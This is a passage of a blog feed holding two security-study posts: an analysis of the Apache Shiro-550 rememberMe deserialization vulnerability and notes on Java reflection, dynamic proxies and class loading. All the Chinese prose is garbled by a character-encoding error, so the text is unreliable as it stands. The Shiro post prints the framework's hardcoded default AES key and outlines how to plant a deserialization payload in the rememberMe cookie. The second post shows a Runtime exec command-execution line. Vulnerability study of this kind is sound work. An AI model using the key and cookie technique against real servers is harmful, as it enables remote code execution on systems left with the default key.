      <title>shiro550ååºåˆ—åŒ–æ¼æ´åˆ†æ</title>
      <link href="/2022/06/17/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>/2022/06/17/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="shiroç®€ä»‹"><a href="#shiroç®€ä»‹" class="headerlink" title="shiroç®€ä»‹"></a>shiroç®€ä»‹</h2><p>Apache Shiroæ˜¯ä¸€ç§åŠŸèƒ½å¼ºå¤§ä¸”æ˜“äºä½¿ç”¨çš„Javaå®‰å…¨æ¡†æ¶ï¼Œå®ƒæ‰§è¡Œèº«ä»½éªŒè¯ã€æˆæƒã€åŠ å¯†å’Œä¼šè¯ç®¡ç†ï¼Œå¯ç”¨äºä¿æŠ¤ä»»ä½•åº”ç”¨ç¨‹åºçš„å®‰å…¨ã€‚</p><p>Shiroæä¾›äº†åº”ç”¨ç¨‹åºå®‰å…¨æ€§APIæ¥æ‰§è¡Œä»¥ä¸‹æ–¹é¢ï¼š</p><p>èº«ä»½éªŒè¯ï¼šè¯æ˜ç”¨æˆ·èº«ä»½ï¼Œé€šå¸¸ç§°ä¸ºç”¨æˆ·ç™»å½•</p><p>æˆæƒï¼šè®¿é—®æ§åˆ¶</p><p>å¯†ç æœ¯ï¼šä¿æŠ¤æˆ–éšè—æ•°æ®ä»¥é˜²çª¥è§†ï¼›</p><p>ä¼šè¯ç®¡ç†ï¼šæ¯ä¸ªç”¨æˆ·çš„æ—¶é—´æ•æ„ŸçŠ¶æ€ã€‚</p><p>Shiroè¿˜æ”¯æŒä¸€äº›è¾…åŠ©åŠŸèƒ½ï¼Œä¾‹å¦‚Webåº”ç”¨ç¨‹åºå®‰å…¨æ€§ï¼Œå•å…ƒæµ‹è¯•å’Œå¤šçº¿ç¨‹æ”¯æŒï¼Œå®ƒä»¬çš„å­˜åœ¨ä¹Ÿæ˜¯ä¸ºäº†åŠ å¼ºä¸Šè¿°å››ä¸ªæ–¹é¢ã€‚</p><h2 id="æ¼æ´ç®€ä»‹"><a href="#æ¼æ´ç®€ä»‹" class="headerlink" title="æ¼æ´ç®€ä»‹"></a>æ¼æ´ç®€ä»‹</h2><p>å½“ shiro ç‰ˆæœ¬ &lt;1.2.5æ—¶ï¼Œä¸»è¦æ˜¯ç”±shiro çš„ rememberMe å†…å®¹ ååºåˆ—åŒ– å¯¼è‡´çš„å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œé€ æˆçš„åŸå› æ˜¯ AESå¯†é’¥è¢«ç¡¬ç¼–ç åœ¨shiroæºç ä¸­ï¼Œè¿™å°±å¯¼è‡´äº†å¯ä»¥é€šè¿‡åœ¨cookieçš„rememberMeå­—æ®µæ’å…¥payloadå®ç°ä»»æ„ä»£ç æ‰§è¡Œ</p><p>åœ¨æˆ‘ä»¬å‹¾é€‰remembermeç™»é™†åï¼Œåˆ·æ–°ï¼ŒæŠ“åŒ…ï¼Œå°†å…¶ JSESSIONID åˆ é™¤ï¼Œä½¿ shiro éªŒè¯cookieä¸­remembermeçš„å€¼æ˜¯å¦æ­£ç¡®ï¼ˆå¦‚æœä¸åˆ é™¤JSESSIONIDï¼Œshiroåˆ™ç›´æ¥ä»¥JSESSIONIDä¸ºç™»é™†å‡­è¯äº†ï¼Œå°±ä¸ä¼šéªŒè¯remembermeä¸­çš„å€¼äº†ï¼‰</p><p>ç®€å•ä»‹ç»åˆ©ç”¨ï¼š<br>é€šè¿‡åœ¨cookieçš„rememberMeå­—æ®µä¸­æ’å…¥æ¶æ„payloadï¼Œ<br>è§¦å‘shiroæ¡†æ¶çš„rememberMeçš„ååºåˆ—åŒ–åŠŸèƒ½ï¼Œå¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œã€‚<br>shiro 1.2.24ä¸­ï¼Œæä¾›äº†ç¡¬ç¼–ç çš„AESå¯†é’¥ï¼škPH+bIxk5D2deZiIxcaaaA==<br>ç”±äºå¼€å‘äººå‘˜æœªä¿®æ”¹AESå¯†é’¥è€Œç›´æ¥ä½¿ç”¨Shiroæ¡†æ¶ï¼Œå¯¼è‡´äº†è¯¥é—®é¢˜</p><h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><p>ç¼–è¾‘å™¨ï¼šIDEA 2021<br>javaç‰ˆæœ¬ï¼šjdk8u65<br>Serverç‰ˆæœ¬ : Tomcat 8.5.81<br>shiroç‰ˆæœ¬ï¼šshiro-root-1.2.4<br><a href="https://codeload.github.com/apache/shiro/zip/shiro-root-1.2.4">shiroç¯å¢ƒæ­å»º</a><br>tomcatå®˜ç½‘ä¸‹è½½å³å¯</p><h2 id="shiroå¯¼å…¥"><a href="#shiroå¯¼å…¥" class="headerlink" title="shiroå¯¼å…¥"></a>shiroå¯¼å…¥</h2><p>ä¸‹è½½å¥½ä»¥åç›´æ¥è§£å‹<br>ç„¶åå·å·çš„è¿›å…¥samples/webç›®å½•ï¼Œç›´æ¥ä¿®æ”¹pomæ–‡ä»¶ï¼Œä¸»è¦ä¿®æ”¹ä¸‹é¢è¿™äº›</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;javax.servlet&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;jstl&lt;/artifactId&gt;</span><br><span class="line">        &lt;!--  è¿™é‡Œéœ€è¦å°†jstlè®¾ç½®ä¸º<span class="number">1.2</span> --&gt;</span><br><span class="line">        &lt;version&gt;<span class="number">1.2</span>&lt;/version&gt;</span><br><span class="line">        &lt;scope&gt;runtime&lt;/scope&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">.....</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;<span class="number">4.0</span>&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;dependencies&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="tomcatå¯¼å…¥"><a href="#tomcatå¯¼å…¥" class="headerlink" title="tomcatå¯¼å…¥"></a>tomcatå¯¼å…¥</h3><p><img src="https://img-blog.csdnimg.cn/156750a0756b447485c57dbdee736246.png"></p><h3 id="waråŒ…å¯¼å…¥"><a href="#waråŒ…å¯¼å…¥" class="headerlink" title="waråŒ…å¯¼å…¥"></a>waråŒ…å¯¼å…¥</h3><p><img src="https://img-blog.csdnimg.cn/e425712ecc704a33bb2c21483f562568.png"></p><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><h3 id="åŠ å¯†æ–¹å¼"><a href="#åŠ å¯†æ–¹å¼" class="headerlink" title="åŠ å¯†æ–¹å¼"></a>åŠ å¯†æ–¹å¼</h3><p>æˆ‘ä»¬è¦ç ”ç©¶çš„æ˜¯å¼€å¯RememberMeåç™»å½•çš„è¿‡ç¨‹ï¼Œæ‰€ä»¥ä»org.apache.shiro.mgt.AbstractRememberMeManager#onSuccessfulLoginå¤„å¼€å§‹å³å¯ï¼Œè¿™é‡Œæ˜¯åˆ¤æ–­æ˜¯å¦å¼€å¯RememberMeç„¶åå¼€å§‹æ“ä½œçš„åœ°æ–¹<br><img src="https://img-blog.csdnimg.cn/ab003e68b1194cdab5a631a992685e08.png"><br>è¿™é‡Œå…ˆæ¸…é™¤è®¤è¯ä¿¡æ¯ï¼Œç„¶åé€šè¿‡isRememberMe()åˆ¤æ–­æ˜¯å¦æœ‰è®¤è¯ä¿¡æ¯ï¼Œä¹Ÿå°±æ˜¯æ˜¯å¦å¼€å¯äº†RememberMeé€‰é¡¹æ¡†ï¼Œè·Ÿè¿›rememberIdentity()æ–¹æ³•<br><img src="https://img-blog.csdnimg.cn/218e474555fd4829a6aa38432e486991.png"><br>é¦–å…ˆè°ƒç”¨getIdentityToRememberå‡½æ•°æ¥è·å–ç”¨æˆ·èº«ä»½(ç”¨æˆ·root)ï¼Œæ¥ç€è·Ÿè¿›rememberIdentityæ„é€ æ–¹æ³•<br><img src="https://img-blog.csdnimg.cn/020f0e15d8c84698985b62911dccc7b2.png"><br>å…¶å®convertPrincipalsToBytesæ–¹æ³•å°†accountPrincipalsï¼ˆä¹Ÿå°±æ˜¯ç”¨æˆ·root)è½¬æ¢ä¸ºå­—èŠ‚å½¢å¼ï¼Œæˆ‘ä»¬å¯ä»¥è·Ÿè¿›ç ”ç©¶ä¸€ä¸‹<br><img src="https://img-blog.csdnimg.cn/ef4dc6a1fe8f40ff9c2b41903ef9b645.png"><br>è¿™é‡Œå°†Principals(ç”¨æˆ·root)åºåˆ—è¯åè¿›è¡ŒencryptåŠ å¯†ï¼Œè·Ÿè¿›encryptå‡½æ•°<br><img src="https://img-blog.csdnimg.cn/a4d182e34b6a46a1afcbf9b26674f9ed.png"><br>å…·ä½“æ€ä¹ˆåˆ†æåŠ å¯†ï¼Œä»–ä¸è§£å¯†æ—¶ä¸€æ ·ï¼Œè¿™é‡Œä¸åœ¨åˆ†æ<br>åŠ å¯†å®Œæˆåæˆ‘ä»¬ç»§ç»­è¿”å›è·Ÿè¿›rememberSerializedIdentity<br><img src="https://img-blog.csdnimg.cn/8f8830585343417088be4c6a7fff7bf5.png"><br>base64ç¼–ç åï¼Œè®¾ç½®åˆ°cookieä¸­ï¼Œå…¶å®åˆ°è¿™é‡Œå°±æ˜¯å­˜å…¥çš„å…¨éƒ¨æµç¨‹ï¼Œåºåˆ—åŒ–â€”&gt;AESåŠ å¯†â€”&gt;base64ç¼–ç â€”&gt;è®¾ç½®åˆ°cookieä¸­çš„remembermeå­—æ®µã€‚</p><h3 id="è§£å¯†æ–¹å¼"><a href="#è§£å¯†æ–¹å¼" class="headerlink" title="è§£å¯†æ–¹å¼"></a>è§£å¯†æ–¹å¼</h3><p>åˆ©ç”¨è´¦å·å¯†ç ç™»å½•ï¼Œæ‰¾åˆ°getRememberedSerializedIdentity()å‡½æ•°<br>æ ¹æ®è¯¥å‡½æ•°åç§°è¿™ä¸ªå‡½æ•°æ˜¯å¾—åˆ°ååºåˆ—åŒ–ä¹‹åçš„cookieå€¼çš„å‡½æ•°<br><img src="https://img-blog.csdnimg.cn/dc4ba7241dda4215b2d4b6b632a9e2d8.png"><br>æ‰¾åˆ°è°ƒç”¨è¿™ä¸ªå‡½æ•°çš„å‡½æ•°getRememberedPrincipals()<br><img src="https://img-blog.csdnimg.cn/b651165dd2ba45bf93b63109d874ee15.png"><br>å‘ç°å¦‚æœbyteä¸ä¸ºç©ºåˆ™è¿›å…¥convertBytesToPrincipalså‡½æ•°ï¼Œè·Ÿè¿›<br><img src="https://img-blog.csdnimg.cn/e89d5b2c3d9b4fb097bcc1472fabc114.png"><br>è¿”ç°å…¶å…ˆè§£å¯†åœ¨è¿›è¡Œååºåˆ—åŒ–<br>è·Ÿè¿›è§£å¯†ï¼ˆè¿™é‡Œè·Ÿè¿›äº†å‡ æ¬¡ï¼‰<br><img src="https://img-blog.csdnimg.cn/f2a6700ad3884ee2bf2618371478b742.png"><br>å‘ç°å‚æ•°å­˜åœ¨å¯†æ–‡å’Œkeyï¼Œæ¨æµ‹æ˜¯å¯¹ç§°å¯†é’¥ï¼Œä¹‹ååœ¨è·Ÿè¿›å‘ç°ä¸ºaesç®—æ³•ï¼Œkeyä¸ºå›ºå®šçš„å¯†é’¥<br><img src="https://img-blog.csdnimg.cn/e6a8c93460974aeaa2dcbfdca7b4fb8a.png"><br>è·Ÿè¿›åºåˆ—åŒ–å‘ç°å­˜åœ¨readObjectï¼Œåˆ¤æ–­åªè¦å­˜åœ¨commons collectionsæ‹“å±•ï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨ccé“¾è¿›è¡Œæ¼æ´åˆ©ç”¨<br><img src="https://img-blog.csdnimg.cn/48c641a4ebd14836b34317d229a20d9e.png"><br>è§£å¯†çš„æµç¨‹åˆ°è¿™å°±ç»“æŸäº†ï¼Œè¯»å–cookieä¸­çš„rememberMeâ€”&gt;base64è§£ç â€”&gt;AESè§£å¯†â€”&gt;ååºåˆ—åŒ–</p><h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p>ï¼ˆåœ¨å®æˆ˜ä¸­ä¸€èˆ¬æˆ‘ä»¬æ— æ³•è¾ƒå¥½çš„åˆ©ç”¨ccï¼Œä»…èƒ½è¾ƒå¥½çš„åˆ©ç”¨cbï¼‰<br>åˆ©ç”¨å°±æ˜¯æ”¹rememberMeï¼Œæˆ‘ä»¬å¯ä»¥å°†æˆ‘ä»¬æ„é€ çš„payloadè¿›è¡ŒaesåŠ å¯†åœ¨ä¼ é€’ï¼Œåœ¨ä¼ é€’æ—¶ï¼Œä¸€å®šè¦å°† JSESSIONIDåˆ é™¤ï¼Œå…·ä½“aesåŠ å¯†å°±ä¸å†æ¼”ç¤º</p><p>Shiroååºåˆ—åŒ–æ¼æ´ç›®å‰ä¸ºæ­¢æœ‰ä¸¤ä¸ªï¼ŒShiro-550(Apache Shiro &lt; 1.2.5)å’Œ Shiro-721( Apache Shiro &lt; 1.4.2 )</p><p>ä¸»è¦åŒºåˆ«åœ¨äº</p><blockquote><p>Shiro550ä½¿ç”¨å·²çŸ¥å¯†é’¥æ’</p><p>Shiro721æ˜¯ä½¿ç”¨ç™»å½•årememberMe={value}å»çˆ†ç ´æ­£ç¡®çš„keyå€¼è¿›è€Œååºåˆ—åŒ–ï¼Œ</p><p>å¯¹æ¯”Shiro550æ¡ä»¶åªè¦æœ‰è¶³å¤Ÿå¯†é’¥åº“ï¼ˆæ¡ä»¶æ¯”è¾ƒä½ï¼‰ã€Shiro721éœ€è¦ç™»å½•ï¼ˆè¦æ±‚æ¯”è¾ƒé«˜é¸¡è‚‹ï¼‰</p><p>Apache Shiro &lt; 1.4.2é»˜è®¤ä½¿ç”¨AES/CBC/PKCS5Paddingæ¨¡å¼</p><p>Apache Shiro &gt;= 1.4.2é»˜è®¤ä½¿ç”¨AES/GCM/PKCS5Paddingæ¨¡å¼</p></blockquote><p><a href="https://www.cnblogs.com/Yang34/p/14122843.html">å¤§ä½¬åšå®¢</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Javaååºåˆ—åŒ–å­¦ä¹ ï¼ˆä¸€ï¼‰</title>
      <link href="/2022/06/07/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0(%E4%B8%80%EF%BC%89/"/>
      <url>/2022/06/07/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0(%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h2 id="Javaåå°„"><a href="#Javaåå°„" class="headerlink" title="Javaåå°„"></a>Javaåå°„</h2><p>åå°„ä¾‹å­</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">//æˆ–å–å®ä¾‹åŒ–å¯¹è±¡</span></span><br><span class="line">        person a = <span class="keyword">new</span> person();</span><br><span class="line">        Class c = a.getClass();</span><br><span class="line">        Constructor personcConstructor = c.getConstructor(String.class,<span class="keyword">int</span>.class);</span><br><span class="line">        <span class="comment">//getConstructor()æ–¹æ³•ç”¨äºè¿”å›ä¸€ä¸ªConstructorå¯¹è±¡ï¼Œè¯¥å¯¹è±¡åæ˜ æ­¤Classå¯¹è±¡è¡¨ç¤ºçš„ç±»çš„ç»™å®šå…¬å…±æ„é€ æ–¹æ³•</span></span><br><span class="line">        person p = (person) personcConstructor.newInstance(<span class="string">&quot;abc&quot;</span>,<span class="number">21</span>);</span><br><span class="line">        <span class="comment">// System.out.println(p);</span></span><br><span class="line">        <span class="comment">//æˆ–å–ç±»ä¸­å±æ€§</span></span><br><span class="line">        <span class="comment">// Field [] personFields = c.getDeclaredFields();</span></span><br><span class="line">        <span class="comment">// for(Field f:personFields)&#123;</span></span><br><span class="line">        <span class="comment">//     System.out.println(f);</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line">        <span class="comment">// Field namefield = c.getField(&quot;name&quot;);</span></span><br><span class="line">        <span class="comment">// namefield.set(p,&quot;xinxin&quot;);</span></span><br><span class="line">        <span class="comment">// System.out.println(p);</span></span><br><span class="line">        <span class="comment">//è°ƒç”¨åå°„é‡Œé¢çš„æ–¹æ³•</span></span><br><span class="line">        <span class="comment">// Method[] personMethods = c.getMethods();</span></span><br><span class="line">        <span class="comment">// for(Method f:personMethods)&#123;</span></span><br><span class="line">        <span class="comment">//     System.out.println(f);</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line">        Method actionmethod = c.getDeclaredMethod(<span class="string">&quot;action&quot;</span>, String.class);</span><br><span class="line">        actionmethod.setAccessible(<span class="keyword">true</span>);<span class="comment">//ä¿®æ”¹æƒé™</span></span><br><span class="line">        actionmethod.invoke(p,<span class="string">&quot;sssss&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¯¦ç»†ä»‹ç»</p><p><a href="https://www.cnblogs.com/yepei/p/5649276.html#:~:text=Class%20%E7%B1%BB%E6%98%AF%E5%9C%A8Java%E8%AF%AD%E8%A8%80%E4%B8%AD%E5%AE%9A%E4%B9%89%E4%B8%80%E4%B8%AA%E7%89%B9%E5%AE%9A%E7%B1%BB%E7%9A%84%E5%AE%9E%E7%8E%B0%E3%80%82%20%E4%B8%80%E4%B8%AA%E7%B1%BB%E7%9A%84%E5%AE%9A%E4%B9%89%E5%8C%85%E5%90%AB%E6%88%90%E5%91%98%E5%8F%98%E9%87%8F%EF%BC%8C%E6%88%90%E5%91%98%E6%96%B9%E6%B3%95%EF%BC%8C%E8%BF%98%E6%9C%89%E8%BF%99%E4%B8%AA%E7%B1%BB%E5%AE%9E%E7%8E%B0%E7%9A%84%E6%8E%A5%E5%8F%A3%EF%BC%8C%E4%BB%A5%E5%8F%8A%E8%BF%99%E4%B8%AA%E7%B1%BB%E7%9A%84%E7%88%B6%E7%B1%BB%E3%80%82%20Class%E7%B1%BB%E7%9A%84%E5%AF%B9%E8%B1%A1%E7%94%A8%E4%BA%8E%E8%A1%A8%E7%A4%BA%E5%BD%93%E5%89%8D%E8%BF%90%E8%A1%8C%E7%9A%84%20Java,%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E4%B8%AD%E7%9A%84%E7%B1%BB%E5%92%8C%E6%8E%A5%E5%8F%A3%E3%80%82%20%E6%AF%94%E5%A6%82%EF%BC%9A%E6%AF%8F%E4%B8%AA%E6%95%B0%E7%BB%84%E5%9D%87%E5%B1%9E%E4%BA%8E%E4%B8%80%E4%B8%AA%20Class%20%E7%B1%BB%E5%AF%B9%E8%B1%A1%EF%BC%8C%E6%89%80%E6%9C%89%E5%85%B7%E6%9C%89%E7%9B%B8%E5%90%8C%E5%85%83%E7%B4%A0%E7%B1%BB%E5%9E%8B%E5%92%8C%E7%BB%B4%E6%95%B0%E7%9A%84%E6%95%B0%E7%BB%84%E5%85%B1%E4%BA%AB%E4%B8%80%E4%B8%AAClass%20%E5%AF%B9%E8%B1%A1%E3%80%82">Classç±»</a></p><p><a href="https://zhuanlan.zhihu.com/p/86293659">Java åå°„æœºåˆ¶</a></p><h2 id="Javaååºåˆ—åŒ–"><a href="#Javaååºåˆ—åŒ–" class="headerlink" title="Javaååºåˆ—åŒ–"></a>Javaååºåˆ—åŒ–</h2><h4 id="å¯ç”¨å½¢å¼"><a href="#å¯ç”¨å½¢å¼" class="headerlink" title="å¯ç”¨å½¢å¼"></a>å¯ç”¨å½¢å¼</h4><p>1ã€å…¥å£ç±»çš„readObjectç›´æ¥è°ƒç”¨å±é™©å‡½æ•°</p><p>2ã€å…¥å£ç±»å‚æ•°ä¸­åŒ…å«å¯æ§ç±»ï¼Œè¯¥å¯æ§ç±»æœ‰å±é™©æ–¹æ³•ï¼ŒreadObjectæ—¶è°ƒç”¨</p><p>è¿‡ç¨‹ï¼šå…¥å£Aï¼ˆhashmapï¼‰æ¥æ”¶å‚æ•°Oï¼ˆurldnsé“¾å­ï¼‰</p><p>â€‹            è¦åˆ©ç”¨çš„ç±» (URL)</p><p>â€‹            ç›®æ ‡è°ƒç”¨B.fï¼ˆfä¸ºhashcodeï¼‰</p><p>â€‹            å½“A.readObject-&gt;O.f-(ç”±äºä¼ å…¥çš„æ˜¯URL)&gt;B.f</p><p>â€‹            ä»è€Œè°ƒç”¨â€œå±é™©â€å‡½æ•°ï¼ˆhashcodeï¼‰</p><p>3ã€å…¥å£å‚æ•°ä¸­åŒ…å«å¯æ§ç±»ï¼Œè¯¥ç±»æœ‰è°ƒç”¨å…¶ä»–å±é™©æ–¹æ³•çš„ç±»ï¼ŒreadObjectæ—¶è°ƒç”¨</p><p>â€‹    <strong>æœ‰æ—¶åœ¨ååºåˆ—åŒ–æ¼æ´ä¸­çš„åº”ç”¨</strong></p><p>â€‹            å®šåˆ¶éœ€è¦çš„å¯¹è±¡</p><p>â€‹            é€šè¿‡invokeè°ƒç”¨é™¤äº†åŒåå‡½æ•°ä»¥å¤–çš„å‡½æ•°</p><p>â€‹            é€šè¿‡Classç±»åˆ›å»ºå¯¹è±¡ï¼Œå¼•ç”¨ä¸èƒ½åºåˆ—åŒ–çš„ç±»</p><p>åŠ¨æ€ä»£ç†ä¸ç®¡ä¼ é€’çš„å‚æ•°æ˜¯ä»€ä¹ˆæ€»ä¼šè°ƒç”¨invokeç±»</p><p>javaå‘½ä»¤æ‰§è¡Œ</p><p> Runtime.getRuntime().exec(â€œcalcâ€)</p><h2 id="åŠ¨æ€ä»£ç†"><a href="#åŠ¨æ€ä»£ç†" class="headerlink" title="åŠ¨æ€ä»£ç†"></a>åŠ¨æ€ä»£ç†</h2><p>åœ¨ä¸ä¿®æ”¹åŸæœ‰ç±»çš„æƒ…å†µä¸‹å¢åŠ åŠŸèƒ½ã€‚</p><p>åœ¨ååºåˆ—åŒ–æ¼æ´çš„ä½œç”¨ï¼š</p><p>readObject-&gt;ååºåˆ—åŒ–è‡ªåŠ¨æ‰§è¡Œ</p><p>invoke-&gt;æœ‰å‡½æ•°è°ƒç”¨</p><p>ä¸»è¦ä»£ç </p><p>test.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"><span class="comment">//import java.io.ObjectInputStream.GetField;</span></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        IUser user= <span class="keyword">new</span> UserImpl();</span><br><span class="line">        <span class="comment">// user.show();</span></span><br><span class="line">        <span class="comment">//é™æ€ä»£ç†ï¼ˆå¦‚æœè¢«ä»£ç†è€…æ·»åŠ æ–¹æ³•ï¼Œproxyä¹Ÿéœ€è¦æ·»åŠ ï¼Œå¾ˆéº»çƒ¦ï¼ï¼‰</span></span><br><span class="line">        <span class="comment">// Userproxy proxy = new Userproxy(user);</span></span><br><span class="line">        <span class="comment">// proxy.show();</span></span><br><span class="line">        <span class="comment">//åŠ¨æ€ä»£ç†</span></span><br><span class="line">        <span class="comment">//è¦ä»£ç†çš„æ¥å£ï¼Œè¦åšçš„äº‹ï¼ŒcalssLader</span></span><br><span class="line">        InvocationHandler useinvocationhandler = <span class="keyword">new</span> Userinvocationhandler(user);</span><br><span class="line">        IUser proxy = (IUser)Proxy.newProxyInstance(user.getClass().getClassLoader(),user.getClass().getInterfaces(),useinvocationhandler);</span><br><span class="line">        proxy.a();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Userinvocationhandler.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> test;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Userinvocationhandler</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span></span>&#123;</span><br><span class="line">    IUser user;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Userinvocationhandler</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Userinvocationhandler</span><span class="params">(IUser user)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.user = user;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable</span>&#123;</span><br><span class="line">        method.invoke(user,args);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ„ä¹‰ï¼šå°‘ä¿®æ”¹ä»£ç ï¼Œé€‚é…æ€§å¼ºã€‚</p><h2 id="ç±»çš„åŠ è½½"><a href="#ç±»çš„åŠ è½½" class="headerlink" title="ç±»çš„åŠ è½½"></a>ç±»çš„åŠ è½½</h2><p>é™æ€ä»£ç å—å’Œéé™æ€ä»£ç å—</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">é™æ€</span><br><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line">éé™æ€</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç›¸åŒç‚¹ï¼šéƒ½æ˜¯JVMåŠ è½½ç±»æ—¶ä¸”åœ¨æ„é€ 